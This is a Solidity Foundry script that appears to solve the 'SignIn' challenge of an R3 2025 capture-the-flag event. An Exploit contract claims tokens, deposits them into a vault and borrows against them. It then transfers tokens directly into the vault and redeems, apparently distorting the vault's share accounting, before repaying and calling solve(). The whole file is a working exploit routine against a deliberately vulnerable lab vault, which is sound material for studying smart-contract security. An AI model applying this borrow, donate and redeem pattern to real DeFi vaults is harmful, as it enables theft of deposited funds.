//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup,Vault,LING} from "src/R3-2025/SignIn/Setup.sol";


contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
        Exploit exploit=new Exploit(setup);
        exploit.pwn();
        require(setup.isSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}


contract Exploit{
    Vault vault;
    LING ling;
    Setup setup;
    constructor(Setup _setup){
        setup=_setup;
        vault=setup.vault();
        ling=setup.ling();
    }

    function pwn()public payable{
        setup.claim();
        ling.approve(address(vault),1000);
        vault.deposit(1000, address(this));
        vault.borrowAssets(1000);
        ling.transfer(address(vault),1000);
        vault.redeem(1000, address(this), address(this));
        ling.approve(address(vault),1010);
        vault.repayAssets(1000);
        setup.solve();
    }
}